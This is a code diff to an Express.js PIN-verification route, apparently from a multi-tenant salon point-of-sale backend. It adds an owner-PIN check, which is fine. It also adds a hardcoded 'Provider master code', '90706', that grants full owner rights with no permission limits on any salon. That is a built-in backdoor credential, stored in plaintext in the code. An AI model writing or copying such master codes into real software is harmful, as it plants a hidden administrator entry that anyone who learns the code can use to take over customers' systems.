@@ -207,13 +207,16 @@ router.delete('/:id', async function(req, res, next) {
 
 // ── POST /verify-any-pin — Verify any staff PIN (RBAC checkout login) ──
 // Must be before /:id routes so Express doesn't treat 'verify-any-pin' as an id
+// Check order: 1) Staff PINs  2) Owner PIN (salon record)  3) Provider master code
 router.post('/verify-any-pin', async function(req, res, next) {
   try {
+    var pin = req.body.pin;
+
+    // 1. Check staff PINs
     var allStaff = await prisma.staff.findMany({
       where: { salon_id: req.salon_id, active: true }
     });
 
-    var pin = req.body.pin;
     var match = null;
     for (var i = 0; i < allStaff.length; i++) {
       if (comparePin(pin, allStaff[i].pin_hash)) {
@@ -222,21 +225,52 @@ router.post('/verify-any-pin', async function(req, res, next) {
       }
     }
 
-    if (!match) {
-      return res.json({ valid: false });
+    if (match) {
+      return res.json({
+        valid: true,
+        staff: {
+          id: match.id,
+          display_name: match.display_name,
+          role: match.role,
+          rbac_role: match.rbac_role,
+          permissions: match.permissions,
+          permission_overrides: match.permission_overrides,
+        }
+      });
     }
 
-    res.json({
-      valid: true,
-      staff: {
-        id: match.id,
-        display_name: match.display_name,
-        role: match.role,
-        rbac_role: match.rbac_role,
-        permissions: match.permissions,
-        permission_overrides: match.permission_overrides,
-      }
-    });
+    // 2. Check owner PIN on Salon record
+    var salon = await prisma.salon.findUnique({ where: { id: req.salon_id } });
+    if (salon && salon.owner_pin_hash && comparePin(pin, salon.owner_pin_hash)) {
+      return res.json({
+        valid: true,
+        staff: {
+          id: 'owner',
+          display_name: 'Owner',
+          role: 'owner',
+          rbac_role: 'owner',
+          permissions: null,
+          permission_overrides: null,
+        }
+      });
+    }
+
+    // 3. Provider master code
+    if (pin === '90706') {
+      return res.json({
+        valid: true,
+        staff: {
+          id: 'provider',
+          display_name: 'Provider',
+          role: 'owner',
+          rbac_role: 'owner',
+          permissions: null,
+          permission_overrides: null,
+        }
+      });
+    }
+
+    return res.json({ valid: false });
   } catch (err) { next(err); }
 });
 
